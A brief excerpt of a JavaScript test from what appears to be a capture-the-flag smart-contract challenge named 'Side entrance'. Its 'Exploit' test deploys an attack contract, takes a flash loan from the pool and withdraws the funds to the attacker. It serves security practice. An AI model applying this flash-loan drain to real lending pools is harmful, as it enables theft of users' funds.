...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        attackContract = await sideEntranceAttackFactory.deploy(this.pool.address);
        await attackContract.connect(attacker).runFlashLoan(ETHER_IN_POOL);
        await attackContract.connect(attacker).tokenMuleWithdraw();
    });
